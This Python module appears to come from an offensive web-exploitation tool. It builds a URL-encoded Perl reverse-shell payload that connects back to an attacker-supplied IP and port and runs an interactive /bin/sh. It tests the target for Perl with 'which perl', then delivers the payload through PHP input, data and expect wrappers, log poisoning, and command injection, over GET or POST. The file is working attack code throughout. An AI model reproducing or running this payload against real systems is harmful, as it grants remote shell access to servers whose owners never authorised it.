"""Perl"""
from src.httpreqs import request
from src.configs import config
from src.utils.encodings import encode
from src.utils.arguments import init_args
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo
from src.utils.colors import Colors


def exploit_perl(exploit, method, ip, port):
    """Exploit perl"""
    args  = init_args()
    url = exploit["GETVAL"]
    post = exploit["POSTVAL"]

    perlTest = "which%20perl"
    perlPayload = (
        f"perl+-e+'use+Socket%3b$i%3d\"{ip}\"%3b$p%3d{port}%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"
        '("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen'
        '(STDERR,">%26S")%3bexec("/bin/sh+-i")%3b}%3b\''
    )

    print(
        Colors().purple("[?]") + " Checking if perl is available on the target system...", flush = True
    )

    if method == "INPUT":
        res, _ = request.REQUEST(
            url.replace(config.tempArg, encode(perlTest)),
            args['httpheaders'],
            exploit["POSTVAL"],
            config.proxies,
            "",
            "",
        )

        if "/bin" in res.text and "/perl" in res.text:
            u = url.replace(config.tempArg, encode(perlPayload))
            printInfo(ip, port, "perl", "input wrapper")
            request.REQUEST(
                u, args['httpheaders'], exploit["POSTVAL"], config.proxies, "", ""
            )

    if method == "DATA":
        if args['postreq']:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(perlTest)),
                args['httpheaders'],
                post,
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(perlTest)),
                args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )

        if "/bin" in res.text and "/perl" in res.text:
            printInfo(ip, port, "perl", "data wrapper")
            if args['postreq']:
                request.REQUEST(
                    url.replace(config.tempArg, encode(perlPayload)),
                    args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(perlPayload)),
                    args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )

    if method == "EXPECT":
        if args['postreq']:
            res, _ = request.REQUEST(
                url,
                args['httpheaders'],
                post.replace(config.tempArg, encode(perlPayload)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(perlTest)),
                args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )

        if "/bin" in res.text and "/perl" in res.text:
            printInfo(ip, port, "perl", "expect wrapper")
            if args['postreq']:
                request.REQUEST(
                    url,
                    args['httpheaders'],
                    post.replace(config.tempArg, encode(perlPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(perlPayload)),
                    args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )

    if method == "TRUNC":
        exploit_log_poison(
            ip,
            port,
            url,
            encode(perlPayload),
            "",
            encode(perlTest),
            "/perl",
            exploit["POSTVAL"],
        )

    if method == "CMD":
        if args['postreq']:
            res, _ = request.REQUEST(
                url,
                args['httpheaders'],
                post.replace(config.tempArg, encode(perlTest)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(perlTest)),
                args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )
        if "/bin" in res.text and "/perl" in res.text:
            printInfo(ip, port, "perl", "command injection")
            if args['postreq']:
                request.REQUEST(
                    url,
                    args['httpheaders'],
                    post.replace(config.tempArg, encode(perlPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(perlPayload)),
                    args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )
